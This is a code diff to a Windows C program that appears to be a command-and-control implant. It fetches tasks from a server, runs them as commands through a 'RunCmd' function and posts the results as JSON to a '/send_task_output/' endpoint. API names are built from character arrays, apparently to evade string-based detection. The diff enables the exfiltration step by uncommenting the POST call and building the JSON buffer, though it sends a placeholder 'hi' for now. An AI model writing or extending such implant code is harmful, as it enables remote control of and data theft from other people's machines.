@@ -53,7 +53,7 @@ typedef BOOL(WINAPI *WINHTTPQUERYHEADERS)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPD
 typedef DWORD(WINAPI *STRTOINTW)(PCWSTR);
 
 // standard esagila api
-typedef CHAR*(WINAPI *RUNCMD)(CCHAR* cmd);
+typedef CHAR*(WINAPI *RUNCMD)(CCHAR* cmd, PDWORD size);
 
 #define WINHTTP_NO_ADDITIONAL_HEADERS NULL
 #define WINHTTP_NO_REQUEST_DATA NULL
@@ -369,7 +369,7 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     return cpBuffer;
 }
 
-void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpoint, const WCHAR* data) {
+void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpoint, const CHAR* data) {
     LPSTR pszData = (LPSTR)data;
     BOOL bResults = FALSE;
 
@@ -937,7 +937,7 @@ void messagebox() {
     CHAR getLastError_c[] = {'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0};
     CHAR wprintf_c[] = {'w', 'p', 'r', 'i', 'n', 't', 'f', 0};
     CHAR printf_c[] = {'p', 'r', 'i', 'n', 't', 'f', 0};
-    CHAR snprintf_c[] = {'s', 'n', 'p', 'r', 'i', 'n', 't', 'f', 0};
+    CHAR snprintf_c[] = {'_', 's', 'n', 'p', 'r', 'i', 'n', 't', 'f', 0};
     CHAR malloc_c[] = {'m', 'a', 'l', 'l', 'o', 'c', 0};
     CHAR calloc_c[] = {'c', 'a', 'l', 'l', 'o', 'c', 0};
     CHAR free_c[] = {'f', 'r', 'e', 'e', 0};
@@ -1039,22 +1039,28 @@ void messagebox() {
     CHAR* task;
     task = parseJsonTask(api, jsonResponse, &taskId, &agentUuid);
 
-    CHAR* output;
-    WCHAR jsonFormat[] = {
+    CHAR* taskOutput;
+    CHAR jsonFormat[] = {
     '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '%', 's', ',', 
-    ' ', '"', 'a', 'g', 'e', 'n', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"', 
+    ' ', '"', 'a', 'g', 'e', 'n', 't', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"', 
     '%', 's', '"', ',', ' ', '"', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 
     'u', 't', '"', ':', ' ', '"', '%', 's', '"', '}', '\0'
     };
-    output = ((RUNCMD)PEsgStdApi->RunCmd)(task);
-    //WCHAR* json = (WCHAR*)((CALLOC)api->calloc)(SIZEHERE ,sizeof(WCHAR));
+
+    DWORD sizeOfOutput;
+    taskOutput = myTrim(((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput), '\n');
+    DWORD totalJsonSize = myStrlenA(jsonFormat) + sizeOfOutput + myStrlenA(taskId) + myStrlenA(agentUuid);
+    CHAR* json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
 
     WCHAR sendOutputPath[] = {'/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u', 't', '/', 0};
 
-    //int written = ((SNPRINTF)api->snprintf)(json, , json, taskId, agentUuid, output);
-    //PostRequest(api, wServer, port, myConcat(api, sendOutputPath, uuid), json);
+    CHAR hi[] = {'h', 'i', 0};
+    int written = ((SNPRINTF)api->snprintf)(json, totalJsonSize*sizeof(CHAR), jsonFormat, taskId, agentUuid, hi);
+    PostRequest(api, wServer, port, myConcat(api, sendOutputPath, uuid), json);
 
-    ((FREE)api->free)(output);
+    ((PRINTF)api->printf)(fString, json);
+    ((FREE)api->free)(taskOutput);
+    ((FREE)api->free)(json);
     ((FREE)api->free)(jsonResponse);
     //((FREE)api->free)(pEsgStdDll);
 }
